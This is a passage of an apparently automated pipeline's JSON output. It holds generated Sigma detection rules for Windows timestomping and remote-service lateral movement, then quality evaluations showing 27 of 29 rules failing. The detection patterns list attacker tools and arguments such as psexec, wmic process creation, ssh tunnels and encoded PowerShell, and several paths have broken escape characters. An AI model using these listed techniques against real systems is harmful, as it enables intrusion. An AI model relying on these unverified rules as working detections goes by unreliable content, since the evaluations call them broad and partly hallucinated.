        "description": "Detects potential timestomping behavior by identifying processes that modify file timestamps using common Windows tools and command-line utilities. This behavior is often used to evade detection by aligning file creation, modification, or access times with legitimate system files.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_file_settime": {
            "Image|endswith": [
              "\fsutil.exe",
              "\touch.exe",
              "\\SetFile.exe"
            ],
            "CommandLine|contains": [
              "settime",
              "-t",
              "-a",
              "-c",
              "-m"
            ]
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": [
              "change",
              "/change",
              "/RL",
              "HIGHEST"
            ]
          },
          "selection_copy_util": {
            "Image|endswith": [
              "\\copy.exe",
              "\robocopy.exe"
            ],
            "CommandLine|contains": [
              "/DCOPY:T",
              "COPYALL",
              "/TIMFIX"
            ]
          },
          "selection_powershell_settime": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Set-CreationTime",
              "Set-LastWriteTime",
              "Set-LastAccessTime",
              "-ExecutionPolicy Bypass",
              "-enc"
            ]
          },
          "condition": "selection_file_settime or selection_schtasks or selection_copy_util or selection_powershell_settime"
        },
        "falsepositives": [
          "Legitimate system administration using fsutil, robocopy, or PowerShell for file time synchronization",
          "Scheduled task modifications by IT staff",
          "Automated backup or file replication scripts using timestamp preservation"
        ],
        "level": "high",
        "tags": [
          "attack.defense-evasion",
          "attack.T1070.006",
          "custom.detection-rule",
          "custom.timestomping",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Indicator Removal",
        "generation_method": "langchain",
        "id": "30edc82c-50d8-483f-92b4-d4f00c1635db"
      },
      {
        "title": "Remote Services Activity via Common Administration Tools and Techniques",
        "description": "Detects Remote Services activity using common administration tools and command-line patterns associated with lateral movement. Covers execution via sc, psexec, wmic, mstsc, ssh, winrm, and other remote service utilities with specific command-line arguments indicative of remote system interaction.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_sc": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": [
              "\\",
              "config",
              "start"
            ]
          },
          "selection_psexec": {
            "Image|endswith": "\\psexec.exe",
            "CommandLine|contains": [
              "\\",
              "-s",
              "-d",
              ":\\"
            ]
          },
          "selection_wmic_process": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": [
              "process",
              "call",
              "create"
            ]
          },
          "selection_wmic_remote": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": [
              "/node:",
              "\\root\\cimv2"
            ]
          },
          "selection_mstsc": {
            "Image|endswith": "\\mstsc.exe",
            "CommandLine|contains": [
              "/v:",
              "/admin"
            ]
          },
          "selection_ssh_connect": {
            "Image|endswith": "\\ssh.exe",
            "CommandLine|contains": [
              "@",
              ":",
              "-L",
              "-R",
              "-J"
            ]
          },
          "selection_winrm_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Enter-PSSession",
              "Invoke-Command",
              "New-PSSession",
              "-ComputerName"
            ]
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": [
              "\\",
              "/S",
              "/RU",
              "task\\"
            ]
          },
          "selection_at": {
            "Image|endswith": "\\at.exe",
            "CommandLine|contains": [
              "\\",
              ":"
            ]
          },
          "condition": "selection_sc or selection_psexec or selection_wmic_process or selection_wmic_remote or selection_mstsc or selection_ssh_connect or selection_winrm_powershell or selection_schtasks or selection_at"
        },
        "falsepositives": [
          "Administrative use of remote management tools by system administrators",
          "Automated IT operations using scheduled tasks or configuration management tools",
          "Legitimate remote desktop connections to servers or workstations",
          "PowerShell remoting in managed environments"
        ],
        "level": "high",
        "tags": [
          "attack.t1021",
          "attack.lateral_movement",
          "detection.rule.remote.services",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Services",
        "generation_method": "langchain",
        "id": "8abc22ee-c6da-41a7-a59c-11152bce49c4"
      }
    ]
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "rules_evaluated": 29,
      "average_quality_score": 0.542,
      "passing_rules": 2,
      "failing_rules": 27,
      "langchain_evaluations": 58,
      "fallback_evaluations": 0,
      "errors": 0,
      "processing_time_ms": 21157.292999999998
    },
    "evaluation_results": [
      {
        "rule_title": "Lateral Movement using 0-Day Vulnerability of Company A's Certificate Program",
        "rule_id": "311f9678-d4a8-4a72-8964-6752a1dc7070",
        "quality_score": 0.32,
        "status": "fail",
        "strengths": [
          "The rule is well-structured and follows the Sigma format",
          "It attempts to detect a specific technique (Lateral Movement)"
        ],
        "weaknesses": [
          "The rule contains no specific indicators of compromise (IOCs) or tactics, techniques, and procedures (TTPs) related to the 0-Day vulnerability of Company A's Certificate Program",
          "It relies on generic command line arguments that may lead to false positives",
          "No real-world verification was performed to validate the rule's effectiveness",
          "The rule does not specify any IPs or domains, but it does contain generic terms like 'company A' and 'certificate' that may not be specific enough"
        ],
        "suggestions": [
          "Add specific IOCs or TTPs related to the 0-Day vulnerability to improve detection accuracy",
          "Use more specific command line arguments or parameters to reduce false positives",
          "Perform real-world verification to validate the rule's effectiveness and adjust the detection logic as needed",
          "Consider adding more context or filtering conditions to reduce noise and improve the signal-to-noise ratio"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.2
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Anti-Forensics and Timestamp Operation Detection",
        "rule_id": "da18c1a8-1c44-4709-891e-6c8b0e7c4b70",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule targets a specific anti-forensics technique",
          "It includes multiple conditions to detect different tools and commands",
          "The rule provides a clear description and tags"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may generate false positives due to legitimate system administration tasks",
          "The rule does not contain any specific IPs or domains, but it relies on general tool names and commands which could lead to false positives"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
          "Add more specific conditions to reduce false positives",
          "Consider adding more tools and commands to the rule to increase its detection coverage",
          "Provide more detailed documentation on the rule's performance and potential false positives"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Command and Scripting Interpreter",
        "rule_id": "688b2663-701f-4b20-a6da-08cb781dcf8e",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule covers multiple command line tools",
          "It includes a list of potential false positives"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification",
          "It may produce false positives due to legitimate system administration tasks",
          "The condition is a simple 'or' statement, which may not be efficient"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's effectiveness",
          "Consider adding more specific conditions to reduce false positives",
          "Optimize the query for better performance",
          "Add more logging sources to increase detection coverage"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploitation for Privilege Escalation via Public Certificate Software",
        "rule_id": "b965a7c9-cf83-4a0a-ac70-9157123b9d43",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique for privilege escalation",
          "It covers multiple potential execution methods (certutil, powershell, cmd)"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world scenario",
          "It may produce false positives due to legitimate use of certutil and powershell commands",
          "The rule contains no specific IPs or domains, but lacks information about the 0-Day vulnerability it aims to detect"
        ],
        "suggestions": [
          "Verify the rule in a real-world scenario to assess its detection coverage",
          "Refine the rule to reduce false positives, potentially by adding more specific conditions or excluding known legitimate use cases",
          "Add more context or information about the 0-Day vulnerability to improve the rule's effectiveness and detection coverage"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Disable or Evade Security Tools via BYOVD",
        "rule_id": "ff9088b9-175d-4f7e-a549-fc9f93d0d214",
        "quality_score": 0.32,
        "status": "fail",
        "strengths": [
          "The rule has a clear title and description",
          "It includes relevant tags and a technique name"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world setting",
          "It contains vague command line arguments that may lead to false positives",
          "The condition is based on a simple 'or' statement which may not be effective in catching the technique",
          "The rule does not include any specific IPs or domains, but the command line arguments used may be too broad and lead to hallucinations"
        ],
        "suggestions": [
          "Verify the rule in a real-world setting to ensure it detects the technique correctly",
          "Refine the command line arguments to reduce false positives",
          "Consider adding more specific conditions to the rule to improve its effectiveness",
          "Add more context to the rule, such as specific IPs or domains, to reduce hallucinations and improve detection accuracy"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.2
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploitation of Public-Facing Application",
        "rule_id": "fa16c117-c3b8-49fc-9c19-a2f3decb052a",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (Exploitation of Public-Facing Application)",
          "It includes relevant tags for attack tactics and techniques",
          "The rule has a clear description and title"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may produce false positives due to legitimate software installations and system updates",
          "The condition is based on simple string matching which could lead to false positives",
          "The rule does not contain any specific IPs or domains from the TTP information, but it also does not include any irrelevant ones"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
          "Consider adding more specific conditions to reduce false positives",
          "Optimize the query for better performance",
          "Include more detailed information about the targeted technique and its characteristics"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Masquerading as System File",
        "rule_id": "c4d8383d-72ae-487d-b618-dabb05976324",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (Masquerading) and has a clear description",
          "It uses a specific log source (Sysmon) and a defined condition for detection"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world scenario, which raises concerns about its effectiveness",
          "It may produce false positives due to legitimate system file executions or administrative tasks",
          "The rule does not contain any IPs or domains, but it lacks specific TTP information (tactic)"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate",
          "Refine the condition to reduce false positives, such as excluding known legitimate system file executions",
          "Add more specific TTP information (tactic) to improve the rule's completeness and effectiveness"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploitation for Client Execution via Certificate Software Vulnerability",
        "rule_id": "c2e9f729-84b8-4bfb-8db4-7dc19e06cfac",
        "quality_score": 0.32,
        "status": "fail",
        "strengths": [
          "The rule has a clear title and description",
          "It uses a specific log source (Sysmon) for process creation events"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It contains no specific IPs or domains from the TTP information, but also does not introduce any hallucinations",
          "The false positives section mentions legitimate system administration tasks and software updates or installations, which could be a significant source of noise"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to assess its detection coverage",
          "Optimize the query for better performance, possibly by reducing the number of selections or using more specific conditions",
          "Consider adding more specific conditions or filtering out known false positives to reduce the false positive rate",
          "Add more context or information about the TTP and the expected behavior to improve the rule's effectiveness"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.2
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Indicator Removal via Prefetch and Crash Dump File Deletion",
        "rule_id": "3752b7e7-e6d2-4aaa-8dda-8a4c4a4be6c8",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule is well-structured and follows the Sigma format",
          "It targets a specific technique (Indicator Removal) and includes relevant tags"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "The false positives section mentions legitimate system file cleanup and disk space management, which could lead to a high false positive rate",
          "The rule does not contain any IPs or domains, but it does not provide any additional context or filtering to reduce false positives",
          "The TTP information is incomplete (missing tactic)"
        ],
        "suggestions": [
          "Perform real-world verification to test the rule's effectiveness",
          "Add additional filtering or context to reduce false positives",
          "Include more detailed TTP information to improve the rule's accuracy and relevance",
          "Consider adding more specific conditions or selections to improve detection coverage"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Indicator Removal via Suspicious Process Creation",
        "rule_id": "d9acf33b-93dd-4cfa-acfb-a7fc1898b997",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (Indicator Removal) and has a clear description",
          "It uses a specific log source (Sysmon) which can provide detailed process creation information",
          "The rule includes a list of potential false positives to consider"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "The condition for detection is quite broad, which may lead to false positives",
          "The rule contains a list of suspicious processes, but it is unclear how these were determined or if they are comprehensive",
          "The rule does not include any IPs or domains, but it does rely on specific process names which may not be present in all environments"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to determine its effectiveness",
          "Consider adding more specific conditions to reduce false positives",
          "Provide more context or explanation for the suspicious processes listed",
          "Consider adding additional log sources or conditions to improve detection coverage"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploitation of Remote Services via Certificate Software Vulnerability",
        "rule_id": "0446d526-f451-4f57-a0dd-940852428bec",
        "quality_score": 0.48,
        "status": "fail",
        "strengths": [
          "The rule has a clear and specific title and description",
          "It includes relevant tags and technique information",
          "The log source is well-defined"
        ],
        "weaknesses": [
          "The rule failed to detect the attack in the real SIEM (0 verified events)",
          "It contains no IPs or domains, but this is not necessarily a weakness in this case",
          "The condition is quite broad and may lead to false positives"
        ],
        "suggestions": [
          "Add more specific conditions to reduce false positives",
          "Consider adding more log sources or detection methods to increase detection coverage",
          "Run verification tests to validate the rule's effectiveness and adjust as needed"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.9,
          "efficiency": 0.7,
          "maintainability": 0.8
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Web Service Exploitation via Legitimate Domains",
        "rule_id": "c5442cec-9d6f-447e-9e34-f8f3f75fb170",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule covers multiple protocols (HTTP and HTTPS) and commands (powershell and cmd) for detecting web service exploitation",
          "It includes a clear description and relevant tags for the technique"
        ],
        "weaknesses": [
          "The rule does not contain any specific IOCs (IPs or domains) from the TTP information, which could lead to a high false positive rate",
          "The condition is a simple 'or' statement, which may not be effective in filtering out legitimate traffic",
          "No real-world verification was performed to validate the rule's effectiveness"
        ],
        "suggestions": [
          "Add specific IOCs (IPs or domains) from the TTP information to improve detection accuracy",
          "Implement more advanced filtering conditions to reduce false positives",
          "Perform real-world verification to validate the rule's effectiveness and identify areas for improvement",
          "Consider adding more fields to the rule, such as a 'threshold' for the number of requests within a certain time frame, to improve detection accuracy"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "File Deletion via System Commands",
        "rule_id": "c6d7771d-6962-4716-aaac-c4eb58f4c26e",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (File Deletion) and uses relevant system commands (cmd.exe, powershell.exe) to detect it",
          "The rule includes a clear description and relevant tags (attack.defense_evasion, attack.t1565, custom.mitre_file_deletion)"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "The rule may generate false positives due to legitimate file deletion activities by system administrators or backup software",
          "The rule does not contain any IP addresses or domains, but it lacks specific TTP information (tactic, id)"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate",
          "Refine the rule to reduce false positives by adding additional conditions or filters",
          "Include more specific TTP information (tactic, id) to improve the rule's completeness and effectiveness"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Software Deployment Tools Detection",
        "rule_id": "3c72acb8-ad8b-40fb-acc7-759f7d230928",
        "quality_score": 0.32,
        "status": "fail",
        "strengths": [
          "The rule attempts to detect software deployment tools used for loader and malware deployment",
          "It covers multiple potential scenarios with different selection criteria"
        ],
        "weaknesses": [
          "The rule failed to detect the attack in the real SIEM, resulting in a low detection coverage score",
          "The rule contains specific command line parameters (e.g., \"conti\", \"loader.exe\", \"malware\") that may not be present in all attacks, potentially leading to false negatives",
          "The rule does not account for potential false positives from legitimate software deployment tools and administrative tasks",
          "The rule contains hallucinations, such as the specific executable names and command line parameters, which are not present in the TTP info"
        ],
        "suggestions": [
          "Improve the rule to detect the technique more effectively, potentially by using more general criteria or adding additional selection criteria",
          "Add more context to the rule to reduce false positives, such as filtering out known legitimate software deployment tools and administrative tasks",
          "Remove hallucinations and focus on more general detection criteria",
          "Test and verify the rule in a real-world environment to ensure its effectiveness and accuracy"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.2
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Application Layer Protocol for C2 Communication",
        "rule_id": "7b35e27f-6278-4f97-8236-cb6652038b37",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule attempts to cover multiple protocols for C2 communication",
          "It considers both HTTP and HTTPS traffic",
          "The rule also looks for specific command line arguments for powershell.exe and certutil.exe"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world scenario",
          "It may generate false positives due to legitimate web traffic and software updates",
          "The condition logic is complex and may be difficult to maintain or optimize",
          "The rule does not contain any specific IPs or domains from the TTP information, but it also does not account for potential evasion techniques"
        ],
        "suggestions": [
          "Verify the rule in a real-world scenario to assess its detection coverage and false positive rate",
          "Consider adding more specific conditions to reduce false positives",
          "Optimize the condition logic for better performance",
          "Add more fields to the rule to account for potential evasion techniques and to increase completeness"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Command and Scripting Interpreter via cmd.exe",
        "rule_id": "9dbf825c-a621-4508-a63e-46fff31a71db",
        "quality_score": 0.32,
        "status": "fail",
        "strengths": [
          "The rule is well-structured and follows the Sigma format",
          "It targets a specific technique (Command and Scripting Interpreter)"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world scenario",
          "It may produce false positives due to legitimate use of perlcritic.exe",
          "The rule contains no IPs or domains, but the TTP information is incomplete"
        ],
        "suggestions": [
          "Perform real-world verification to test the rule's effectiveness",
          "Add more specific conditions to reduce false positives",
          "Consider adding more TTP information to improve the rule's accuracy and completeness"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.2
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploitation for Privilege Escalation via PROCEXP152.sys",
        "rule_id": "20663336-a275-42ee-9d55-4591acb3d294",
        "quality_score": 0.32,
        "status": "fail",
        "strengths": [
          "The rule is well-structured and follows the Sigma format",
          "It targets a specific technique for privilege escalation"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may produce false positives due to legitimate system processes or system administrator activities",
          "The condition is based on simple string matching which could lead to false positives or false negatives",
          "The rule does not contain any IP or domain information, but it lacks specific TTP information to verify its accuracy"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
          "Consider adding more specific conditions to reduce false positives",
          "Use more advanced query techniques, such as behavioral analysis or anomaly detection, to improve performance",
          "Include more detailed TTP information to improve the rule's accuracy and effectiveness"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.2
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Network Service Discovery via fswss.exe",
        "rule_id": "49a3d031-813e-46fa-9289-9206f0223ad4",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule is focused on a specific technique (Network Service Discovery) and uses a clear condition for detection",
          "The rule includes relevant tags (attack.discovery, attack.T1046) for easy filtering and analysis"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "The rule does not account for potential false positives beyond legitimate administrative use",
          "The rule contains no IPs or domains, but lacks information on the TTP's tactic, which could be useful for further analysis"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection capabilities and adjust the condition as needed",
          "Consider adding more specific conditions to reduce false positives, such as filtering out known administrative tools or scripts",
          "Include more detailed information about the TTP, such as its tactic, to improve the rule's context and effectiveness"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Create or Modify System Process via Command Line or Script",
        "rule_id": "623fffc1-cb17-4835-8700-1f149fa5ccda",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers multiple command-line tools and scripting engines",
          "It includes a list of potential false positives to consider",
          "The rule is well-structured and easy to understand"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification",
          "It may generate false positives due to administrative or automated use of the detected commands",
          "The rule does not contain any specific IPs or domains, but it could be improved with more context about the TTP"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's effectiveness",
          "Consider adding more specific conditions to reduce false positives",
          "Add more context about the TTP, such as specific tactics or techniques, to improve the rule's accuracy"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "V3 Security Product Impairment via Malicious Process",
        "rule_id": "df8a4fd3-b9a9-4ed6-83b4-991d20db7d88",
        "quality_score": 0.6599999999999999,
        "status": "fail",
        "strengths": [
          "The rule has a clear and focused detection logic",
          "It covers multiple scenarios for impairing V3 security product defenses",
          "The rule includes a list of potential false positives to consider"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may produce false positives due to legitimate administrative scripts or authorized security tooling",
          "The rule contains no specific IPs or domains, but its effectiveness relies on the quality of the input data"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
          "Consider adding more specific conditions to reduce false positives",
          "Monitor the rule's performance and adjust it as needed to ensure it remains efficient and effective"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detected Process Injection Activity via Suspicious Parent-Child Process Relationships",
        "rule_id": "749af810-e9ee-4260-b280-3e46c1deb798",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and relevant technique (Process Injection)",
          "It includes multiple selections to cover different aspects of the technique",
          "The rule provides a clear description and relevant tags"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world scenario, which raises concerns about its effectiveness",
          "It may produce false positives due to legitimate administrative scripts or software deployment tools",
          "The rule contains no IPs or domains, but it lacks specific TTP information, making it difficult to assess its accuracy"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate",
          "Refine the selections to reduce potential false positives",
          "Include more specific TTP information to improve the rule's accuracy and effectiveness"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Application Layer Protocol Activity via NLP Pattern Matching",
        "rule_id": "b1b6c617-82dc-4365-be1c-5d16ee76fb1a",
        "quality_score": 0.7,
        "status": "pass",
        "strengths": [
          "The rule covers multiple tools and command-line arguments associated with data exfiltration or C2 traffic over common application protocols",
          "It includes a comprehensive list of false positives to consider",
          "The rule is well-structured and easy to understand"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification, making it difficult to assess its effectiveness",
          "The rule contains no IPs or domains, but it does not include any network-related conditions, which might limit its detection capabilities",
          "The condition is a simple 'or' statement, which might lead to a high number of false positives"
        ],
        "suggestions": [
          "Perform real-world verification to test the rule's effectiveness",
          "Consider adding network-related conditions to improve detection capabilities",
          "Refine the condition to reduce the number of false positives, such as by adding additional filters or using more specific keywords"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Command and Scripting Interpreter Activity via Behavioral Patterns",
        "rule_id": "ee9e67e9-5011-447e-b5b1-fed29853785e",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers multiple command-line patterns indicative of malicious scripting execution",
          "It includes various selection criteria for different interpreters like PowerShell, cmd.exe, and WMIC",
          "The rule provides a list of potential false positives, which can aid in tuning and refinement"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification, which raises concerns about its effectiveness",
          "It contains a broad range of command-line patterns that could lead to false positives, especially in environments with high administrative activity",
          "The rule lacks specific IPs or domains from the TTP information, but it also does not introduce any hallucinations"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate accurately",
          "Refine the selection criteria to reduce false positives, potentially by adding more specific conditions or excluding known benign patterns",
          "Consider adding more context or filtering based on user identity, process parentage, or other relevant factors to improve the rule's accuracy and efficiency"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "C2 Communication via Command-Line Tools",
        "rule_id": "6f3caf92-b1ce-482a-93e7-f61a87db01f1",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (Command and Control) and includes relevant command-line tools",
          "It covers multiple tools and potential evasion techniques",
          "The rule includes a list of potential false positives, which can help with tuning"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification, which limits its reliability",
          "The rule may generate false positives due to legitimate administrative activity",
          "It contains no IPs or domains, but the lack of verification makes it difficult to assess its effectiveness",
          "The condition is a simple 'or' statement, which may not be sufficient to filter out noise"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's effectiveness and identify potential false positives",
          "Consider adding more specific conditions or filtering to reduce false positives",
          "Add more context to the rule, such as potential IOCs or network activity, to improve its detection capabilities",
          "Regularly review and update the rule to ensure it remains relevant and effective against evolving threats"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploit Public-Facing Application via NLP Pattern Matching",
        "rule_id": "0a901713-9601-4eeb-8ff7-11262bb128d2",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule attempts to cover various aspects of the Exploit Public-Facing Application technique",
          "It uses a combination of keyword matching and suspicious tool detection to identify potential threats"
        ],
        "weaknesses": [
          "The rule lacks real-world verification, making its effectiveness uncertain",
          "It may produce false positives due to the broad nature of the keywords and tools used",
          "The rule contains no specific IPs or domains, but its reliance on generic keywords may lead to hallucinations"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate",
          "Refine the keywords and tools used to reduce false positives and improve detection accuracy",
          "Consider adding more specific indicators of compromise (IOCs) to enhance the rule's effectiveness"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Network Service Discovery via Command Line Tools",
        "rule_id": "dd62fc6e-fa4e-45bd-bb62-9cc55d1aec54",
        "quality_score": 0.7,
        "status": "pass",
        "strengths": [
          "The rule covers multiple command line tools used for network service discovery",
          "It includes various parameters and options for each tool to increase detection accuracy",
          "The rule is well-structured and easy to understand"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification, which makes it difficult to assess its effectiveness",
          "The rule may generate false positives due to legitimate network troubleshooting activities",
          "The rule contains no IPs or domains, but it lacks specific TTP information, which could lead to hallucinations if not properly tuned"
        ],
        "suggestions": [
          "Perform real-world verification to test the rule's effectiveness and identify potential false positives",
          "Add more specific TTP information to the rule to reduce hallucinations and improve detection accuracy",
          "Consider adding more tools and parameters to the rule to increase its detection coverage",
          "Optimize the rule's performance by reducing the number of conditions and using more efficient query methods"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Archive Collected Data via Command-Line Archiving Tools",
        "rule_id": "8b113719-9de4-4b92-a024-7e1b2073d402",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers various archiving tools and techniques",
          "It includes a clear description of the detection logic and the targeted TTP",
          "The rule is well-structured and easy to understand"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may generate false positives due to legitimate administrative scripts or system maintenance tasks",
          "The rule contains no IPs or domains, but it lacks specific TTP information"
        ],
        "suggestions": [
